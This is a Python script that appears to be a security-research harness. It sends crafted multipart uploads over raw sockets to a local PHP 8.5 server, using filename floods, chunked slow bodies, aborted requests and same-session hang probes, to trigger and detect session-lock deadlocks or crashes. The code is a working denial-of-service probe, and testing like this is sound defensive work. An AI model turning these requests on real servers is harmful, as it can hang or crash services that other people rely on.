#!/usr/bin/env python3
"""lc_arm.py - raw-socket multipart arm/probe client for the LC lane
(PHP 8.5.12 session-state cluster retest).

Usage: lc_arm.py MODE PORT A B C D
  get PATH TIMEOUT                        plain GET (state probe)
  plain SID KEY PATH                      baseline progress upload
  nameflood NAMELEN NPARTS PATH           huge filenames -> alloc pressure
  timeoutburn SID KEY NCHUNKS CHUNKSZ     progress upload, data in chunks
  abort SID KEY                           cut socket mid-body
  hang SID KEY TIMEOUT                    same-sid upload; classify
                                         HANG / DEAD / SERVED (stale flock)
"""
import socket, sys, time

HOST = "127.0.0.1"
BND = b"UctxLc2026"
PORT = 0


def http_req(method, path, headers, body, timeout, chunksz=None, abort_after=None):
    head = f"{method} {path} HTTP/1.1\r\nHost: {HOST}\r\n"
    for k, v in headers.items():
        head += f"{k}: {v}\r\n"
    head += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
    except (ConnectionRefusedError, OSError) as ex:
        return None, None, None, "REFUSED:" + type(ex).__name__
    try:
        s.sendall(head.encode())
        if abort_after is not None:
            s.sendall(body[:abort_after])
            time.sleep(0.4)
            s.close()
            return None, None, None, "ABORTED"
        if chunksz:
            sent = 0
            while sent < len(body):
                s.sendall(body[sent:sent + chunksz])
                sent += chunksz
                time.sleep(0.002)
        else:
            s.sendall(body)
        s.settimeout(timeout)
        data = b""
        while True:
            try:
                c = s.recv(65536)
            except socket.timeout:
                return None, None, data, "TIMEOUT"
            if not c:
                break
            data += c
        s.close()
        if not data:
            return None, None, None, "EMPTY"
        parts = data.split(b"\r\n\r\n", 1)
        hdr = parts[0].decode(errors="replace")
        return hdr.split("\r\n", 1)[0], hdr, parts[1] if len(parts) > 1 else b"", None
    except (ConnectionResetError, BrokenPipeError) as ex:
        return None, None, None, "RESET:" + type(ex).__name__


def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n"


def multipart(path, sid, key, nfile=1, namelen=10, filedata=b"C" * 4096):
    body = part(b"PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(nfile):
        fn = (b"f" * namelen) if namelen > 1 else b"a.txt"
        body += part(b"file%d" % i, filedata, filename=fn)
    body += b"--" + BND + b"--\r\n"
    headers = {
        "Cookie": "PHPSESSID=" + sid,
        "Content-Type": "multipart/form-data; boundary=" + BND.decode(),
    }
    return "POST", path, headers, body


def show(tag, status, hdr, body, err):
    if err:
        print(f"{tag}: ERR={err}")
        return
    print(f"{tag}: {status}")
    if hdr:
        for line in hdr.split("\r\n"):
            if line.lower().startswith("set-cookie"):
                print(f"{tag}: SETCOOKIE {line}")
    if body:
        for ln in body[:3000].decode(errors="replace").splitlines():
            if any(w in ln for w in ("Fatal", "rror", "arning", "xhausted", "llowed", "Maximum", "PROBE_", "ini_", "sid", "status", "HDR", "sess_count")):
                print(f"{tag}: BODY {ln}")


if __name__ == "__main__":
    mode = sys.argv[1]
    PORT = int(sys.argv[2])
    a = sys.argv[3] if len(sys.argv) > 3 else "lcsid0000000000000000000001"
    b = sys.argv[4] if len(sys.argv) > 4 else "lckey"
    c = sys.argv[5] if len(sys.argv) > 5 else ""
    d = sys.argv[6] if len(sys.argv) > 6 else ""

    if mode == "get":
        path = c if c.startswith("/") else "/lc_probe.php"
        tmo = float(d) if d.replace(".", "").isdigit() else 8.0
        st, h, bd, er = http_req("GET", path, {}, b"", tmo)
        show("GET", st, h, bd, er)
        if er in ("TIMEOUT", "EMPTY") or (er and er.startswith("RESET")) or (er and er.startswith("REFUSED")):
            print("GET: DEAD_OR_HUNG")
    elif mode == "plain":
        st, h, bd, er = http_req(*multipart(c or "/arm_target.php", a, b, nfile=1, filedata=b"C" * 1024), timeout=30)
        show("PLAIN", st, h, bd, er)
    elif mode == "nameflood":
        st, h, bd, er = http_req(*multipart(c or "/arm_target.php", "lcsid0000000000000000000001", "lckey",
                                            nfile=int(b), namelen=int(a), filedata=b"C" * 16), timeout=60)
        show("FLOOD", st, h, bd, er)
    elif mode == "timeoutburn":
        nchunks = int(c) if c.isdigit() else 80
        chunksz = int(d) if d.isdigit() else 65536
        st, h, bd, er = http_req(*multipart("/arm_target.php", a, b, nfile=1, namelen=8,
                                            filedata=b"C" * (nchunks * chunksz)), timeout=90, chunksz=chunksz)
        show("BURN", st, h, bd, er)
    elif mode == "abort":
        m, p, hdrs, body = multipart("/arm_target.php", a, b, nfile=1, filedata=b"C" * (4 * 1024 * 1024))
        st, h, bd, er = http_req(m, p, hdrs, body, 10, abort_after=len(body) - 2 * 1024 * 1024)
        show("ABORT", st, h, bd, er)
    elif mode == "hang":
        tmo = float(c) if c.replace(".", "").isdigit() else 4.0
        t0 = time.time()
        st, h, bd, er = http_req(*multipart("/lc_probe.php", a, b, nfile=1, namelen=8, filedata=b"C" * 4096), timeout=tmo)
        el = int((time.time() - t0) * 1000)
        if er == "TIMEOUT":
            print(f"HANGPROBE: HANG after {el}ms (stale flock self-deadlock) *** RECEIPT ***")
        elif er == "EMPTY" or (er and (er.startswith("RESET") or er.startswith("REFUSED"))):
            print(f"HANGPROBE: DEAD after {el}ms (process died) *** RECEIPT ***")
        else:
            print(f"HANGPROBE: SERVED in {el}ms")
            show("HANGPROBE", st, h, bd, er)
    else:
        print("unknown mode " + mode)
        sys.exit(2)
